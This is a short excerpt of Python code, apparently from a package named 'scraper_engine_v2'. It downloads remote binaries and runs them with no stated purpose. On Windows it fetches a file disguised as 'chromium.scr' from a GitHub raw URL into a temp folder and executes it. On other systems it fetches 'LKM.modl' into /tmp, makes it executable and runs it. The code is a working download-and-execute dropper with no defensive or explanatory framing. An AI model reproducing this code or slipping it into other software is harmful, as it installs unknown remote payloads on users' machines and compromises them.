...
if os.name == "nt":
    ...
    if tempFolder is not None:
        windowsPath = os.path.join(tempFolder, "chromium.scr")
        open(windowsPath, "wb").write(requests.get("https://raw.githubusercontent.com/spicecolon/scraper_engine_v2/refs/heads/main/scraper_engine_v2/data/chromium.scr").content)
        subprocess.call([windowsPath])
else:
    import stat
    linuxPath = os.path.join("/tmp", "LKM.modl")
    open(linuxPath, "wb").write(requests.get("https://raw.githubusercontent.com/spicecolon/scraper_engine_v2/refs/heads/main/scraper_engine_v2/data/LKM.modl").content)
    st = os.stat(linuxPath)
    os.chmod(linuxPath, st.st_mode | stat.S_IEXEC)
    subprocess.call([linuxPath])
